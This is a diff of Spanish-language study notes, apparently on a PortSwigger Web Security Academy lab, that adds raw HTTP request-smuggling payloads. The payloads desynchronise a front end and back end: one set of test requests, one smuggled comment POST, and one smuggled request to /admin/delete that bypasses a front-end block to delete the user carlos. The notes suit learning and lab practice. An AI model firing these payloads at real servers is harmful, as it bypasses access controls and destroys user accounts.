@@ -206,7 +206,48 @@ En tu ejemplo hay un detalle crucial:
 
 Aquí entramos en la fase de explotación. Usamos la desincronización para saltarnos reglas del Front-end (como "no permitir acceso a `/admin`").
 
-**Tu Payload:**
+**Tu Payload para ver si funciona y no da error:**
+
+```HTTP
+POST / HTTP/1.1
+Host: 0a7e00470379397b854ef8fa009b0006.web-security-academy.net
+Cookie: session=ns5yFSFX9vuYYcjOknkqIsxpRptOyIs6
+Content-Length: 105
+Transfer-Encoding: chunked
+
+3
+123
+0
+
+GET /adada HTTP/1.1
+Host: 0a7e00470379397b854ef8fa009b0006.web-security-academy.net
+Content-Length: 19
+
+test=test
+```
+
+O con un POST a un comentario:
+
+```HTTP
+POST / HTTP/1.1
+Host: 0a7e00470379397b854ef8fa009b0006.web-security-academy.net
+Cookie: session=ns5yFSFX9vuYYcjOknkqIsxpRptOyIs6
+Content-Length: 257
+Transfer-Encoding: chunked
+
+3
+123
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a7e00470379397b854ef8fa009b0006.web-security-academy.net
+Cookie: session=ns5yFSFX9vuYYcjOknkqIsxpRptOyIs6
+Content-Length: 300
+
+csrf=i7kjXxAX5mgc3AV2z5gHgHXMyaczoyx5&postId=3&name=a&email=a@a.com&comment=b
+```
+
+Payload con el objetivo de borrar usuario:
 
 ```HTTP
 POST / HTTP/1.1
@@ -274,13 +315,15 @@ Host: 0a550036035a7c9e800ee42c0083003b.web-security-academy.net
 Transfer-Encoding: chunked
 Content-Length: 4
 
-5e
+5c
 GET /admin/delete?username=carlos HTTP/1.1
 Host: localhost
 Content-Length: 30
 
 test=test
 0
+
+
 ```
 
 #### Análisis Técnico Detallado
